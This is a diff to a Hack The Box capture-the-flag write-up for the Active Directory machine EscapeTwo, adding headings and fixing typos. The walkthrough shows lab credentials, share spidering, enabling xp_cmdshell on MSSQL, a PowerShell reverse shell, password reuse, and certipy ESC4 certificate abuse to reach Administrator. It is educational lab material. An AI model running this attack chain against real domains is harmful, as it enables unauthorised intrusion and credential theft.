@@ -6,10 +6,11 @@ tags: [AD, Certipy, Bloodhound, ACL, ESC4]
 image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d5fcf2425893a73cf137284e2de580e1.png
 ---
 
-EscapeTwo is an easy assumed breached Active Directory machine. We are provided credentials for the user Rose which has access to the Accounting Department shares which contains two spreadsheet files which are corrupted, after fixing these files it can be seen that one of them contains credentials for some users. One of these users has admin rights to the MSSql server which can execute commands. After getting a reverse shell we can read files inside of the server. One of the config files for the MSSql server contains credentials for the svc_sql user but this password has been reused by the user ryan which can change the ownership of the ca_svc user. This user can use ESC4 on a vulnerable certificate template to gain the NTLM hash of the Administrator user. 
+EscapeTwo is an easy assumed breached Active Directory machine. We are provided credentials for the user Rose which has access to the Accounting Department share which contains two spreadsheet files which are corrupted, after fixing these files, it can be seen that one of them contains credentials for some users. One of these users has admin rights to the MSSql server which can execute commands. After getting a reverse shell we can read files inside of the server. One of the config files for the MSSql server contains credentials for the svc_sql user but this password has been reused by the user ryan which can change the ownership of the ca_svc user. This user can use ESC4 on a vulnerable certificate template to gain the NTLM hash of the Administrator user. 
 
 ![escape_info_card](assets/images/escapetwo/EscapeTwo.png)
 
+## NMAP Scan
 
 As always we can start with an nmap scan to show which ports this machine has open. 
 
@@ -77,7 +78,7 @@ From the output we can determine that this is a domain controller in an Active D
 ```
 10.10.11.51 sequel.htb DC01.sequel.htb DC01
 ```
-
+## Enumerating Shares
 Since this is an assumed breach box, we have the credentials for rose which we can use to enumerate ths shares being listed. 
 
 ![escape_info_card](assets/images/escapetwo/shares.png)
@@ -87,14 +88,17 @@ We see two non-default shares being hosted; Accounting Department and Users. I u
 ```
 netexec smb sequel.htb -u rose -p KxEPkKe6R8su --shares -M spider_plus -o DOWNLOAD_FLAG=True
 ```
-After downloading the files we can see that the only shares that contain file are the Accounting Department, SYSVOL and Users. We can discard SYSVOL and Users as they do not contain any interesting files. We are left with the former which has two spreadsheet files. If we try to open these files we see that they are corrupted.
+
+## Discovering the Corrupted Spreadsheet Files
+After downloading the files we can see that the only shares that contain files are the Accounting Department, SYSVOL and Users. We can discard SYSVOL and Users as they do not contain any interesting files. We are left with the former which has two spreadsheet files. If we try to open these files we see that they are corrupted.
 
 ![escape_info_card](assets/images/escapetwo/corrupted.png)
 
-If we run `file` against these spreadsheets we see that they are corrupted
+If we run `file` against these spreadsheets we see that they are listed as ZIP files.
 
 ![escape_info_card](assets/images/escapetwo/files.png)
 
+#### Unzipping the files
 I found two ways to read the content inside of the spreadsheets the first one consists of using `unzip` to unzip the spreadsheets before that we must rename the files to .zip instead of .xlxs.
 
 ```
@@ -115,8 +119,8 @@ cat xl/sharedStrings.xml
 <t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si>
 <si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
 ```
- 
-THe other method consists of fixing the magic bytes in the original file to match the correct xlsx magic bytes. As we can see from the image below the current magic bytes are set to be `50 48 04 03` which represent a zip file. We must change them to be `50 4B 03 04`
+#### Changing the Magic Bytes
+The other method consists of fixing the magic bytes in the original file to match the correct xlsx magic bytes. As we can see from the image below the current magic bytes are set to be `50 48 04 03` which represent a zip file. We must change them to be `50 4B 03 04`
 ![escape_info_card](assets/images/escapetwo/bytes.png)
 
 We can then use `hexedit` to change the magic bytes. Once this is done we can open the spreadsheet.
@@ -127,8 +131,8 @@ We can see that there are now some more credentials, if we pass these credential
 
 
 ![escape_info_card](assets/images/escapetwo/enum.png)
-
-Instead we can use the sa user to login into the MSSql database. It is important to note that we are using a local auth as the sa user does not actually exist on the domain only locally on the DC. Since this account is probably a sql admin we can probably use the `xp_cmdshell` functionality to run commands. Below are the steps needed to activate this.
+## Getting Admin Access to the MSSql Server
+Instead we can use the sa user to login into the MSSql database. It is important to note that we are using a local auth as the sa user does not actually exist on the domain only locally on the DC. Since this account is probably an sql admin we can probably use the `xp_cmdshell` functionality to run commands. Below are the steps needed to activate this function. Note that it did not work first try as the feature was disabled.
 
 ```
 sqsh -S sequel.htb -U sa -P 'MSSQLP@ssw0rd!' -h
@@ -157,10 +161,12 @@ Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE stat
 	sequel\sql_svc                                                                                                                                                                                NULL  
 ```
 
+## Getting a Reverse Shell
 To get a shell on this box I used [this site](https://www.revshells.com/) to generate a base64 encoded powershell reverse shell and executed it using `xp_cmdshell`.
 
 ![escape_info_card](assets/images/escapetwo/reverse.png)
 
+## Finding Credentials for More Users
 If we go to the root directory of this server we can see a non-default directory called SQL2019, inside of this directory we can see a configuration file that contains some new credentials for the sql_svc service account. Using password spraying we can find that the user ryan is also using the same password.
 
 ```
@@ -187,7 +193,7 @@ SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
 SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
 ```
 
-Ryan can also winrm into the DC which gives us access to the user flag. From this winrm session we can also run SharpHound to enumerate the ACL's of each user. We could have ran bloodhound form Linux but SharpHound is almost always more complete as the Linux version tends to skip some ACLs.
+Ryan can also winrm into the DC which gives us access to the user flag. From this winrm session we can also run SharpHound to enumerate the ACL's of each user. We could have ran bloodhound form Linux but SharpHound is almost always more complete as the python version tends to skip some ACLs.
 
 ![escape_info_card](assets/images/escapetwo/winrm.png)
 
@@ -196,7 +202,7 @@ After transferring the SharpHound.exe binary over to ryan's desktop we can then 
 ```
 .\SharpHound.exe -c All --zipfilename sequel.htb
 ```
-
+## Finding the WriteOwner ACL
 Once we have the data we can upload it to bloodhound from where we can view the following ACL.
 
 ![escape_info_card](assets/images/escapetwo/acl.png)
@@ -231,6 +237,8 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 net rpc password "ca_svc" "password" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "DC01.sequel.htb"
 ```
+
+## Privilege Escalation
 The certificate authority account can have special permissions over different certificate templates which may be vulnerable to exploits. We can use certipy to find these vulnerabilities.
 
 ```
@@ -291,7 +299,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'DunderMifflinAuthentication
 ```
 
-Then we can request the administrator pfx with the following command. If the command fails I recommend adding more flag like the subject. In the case that we get an error saying that the SIDs do not match I recommend simply removing the SID flag entirely as I still worked without it.
+Then we can request the administrator pfx with the following command. If the command fails I recommend adding more flags like the subject. In the case that we get an error saying that the SIDs do not match I recommend simply removing the SID flag entirely as it still worked without it.
 
 ```
 certipy req  -u 'ca_svc@sequel.htb' -p 'password'  -dc-ip '10.10.11.51' \
